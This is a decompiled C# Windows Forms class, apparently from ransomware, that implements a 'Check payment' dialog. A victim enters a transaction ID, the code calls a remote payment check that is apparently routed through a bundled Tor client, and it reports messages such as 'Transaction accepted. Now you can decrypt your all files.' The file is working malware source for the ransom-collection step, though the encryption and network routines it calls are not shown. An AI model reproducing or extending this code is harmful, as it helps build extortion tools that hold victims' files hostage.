using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace wg;

public class CheckPaymentForm : Form
{
	private IContainer components;

	private TextBox TransactionIdText;

	private Button CheckPayment;

	private Label TransactionId;

	public CheckPaymentForm()
	{
		InitializeComponent();
		((Control)TransactionIdText).set_Text(Utils.LastTransaction);
	}

	private void ShowNotification(IWin32Window owner, int result)
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		switch (result)
		{
		case -10:
			MessageBox.Show((IWin32Window)(object)this, "Can not extract tor bundle", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			break;
		case -8:
			MessageBox.Show((IWin32Window)(object)this, "Unknown error", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			break;
		case -6:
			MessageBox.Show((IWin32Window)(object)this, "Can not start tor. Check internet connection or proxy settings", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			break;
		case -2:
			MessageBox.Show((IWin32Window)(object)this, "Your key is wrong. Contact support", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			break;
		case -1:
			MessageBox.Show((IWin32Window)(object)this, "Transaction not accepted yet. Try again later", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			break;
		case 0:
			MessageBox.Show((IWin32Window)(object)this, "Transaction accepted. Now you can decrypt your all files", "Success", (MessageBoxButtons)0, (MessageBoxIcon)48);
			break;
		case -9:
		case -7:
		case -5:
		case -4:
		case -3:
			break;
		}
	}

	private void CheckPayment_Click(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		if (string.IsNullOrEmpty(((Control)TransactionIdText).get_Text()))
		{
			MessageBox.Show((IWin32Window)(object)this, "Enter transaction ID", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		Utils.LastTransaction = ((Control)TransactionIdText).get_Text();
		Utils.CheckInternetConnection();
		if (Utils.inetAvail)
		{
			int result = Utils.CheckPayment(((Control)TransactionIdText).get_Text(), Utils.useProxy);
			ShowNotification((IWin32Window)(object)this, result);
		}
		else
		{
			MessageBox.Show((IWin32Window)(object)this, "Can not connect to remote server. Check your internet connection or try again later", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		TransactionIdText = new TextBox();
		CheckPayment = new Button();
		TransactionId = new Label();
		((Control)this).SuspendLayout();
		((Control)TransactionIdText).set_Location(new Point(100, 12));
		((Control)TransactionIdText).set_Name("TransactionIdText");
		((Control)TransactionIdText).set_Size(new Size(261, 20));
		((Control)TransactionIdText).set_TabIndex(0);
		((Control)CheckPayment).set_Location(new Point(272, 38));
		((Control)CheckPayment).set_Name("CheckPayment");
		((Control)CheckPayment).set_Size(new Size(89, 26));
		((Control)CheckPayment).set_TabIndex(1);
		((Control)CheckPayment).set_Text("Check payment");
		((ButtonBase)CheckPayment).set_UseVisualStyleBackColor(true);
		((Control)CheckPayment).add_Click((EventHandler)CheckPayment_Click);
		((Control)TransactionId).set_AutoSize(true);
		((Control)TransactionId).set_Location(new Point(12, 15));
		((Control)TransactionId).set_Name("TransactionId");
		((Control)TransactionId).set_Size(new Size(80, 13));
		((Control)TransactionId).set_TabIndex(2);
		((Control)TransactionId).set_Text("Transaction ID:");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(383, 80));
		((Control)this).get_Controls().Add((Control)(object)TransactionId);
		((Control)this).get_Controls().Add((Control)(object)CheckPayment);
		((Control)this).get_Controls().Add((Control)(object)TransactionIdText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("CheckPaymentForm");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)4);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
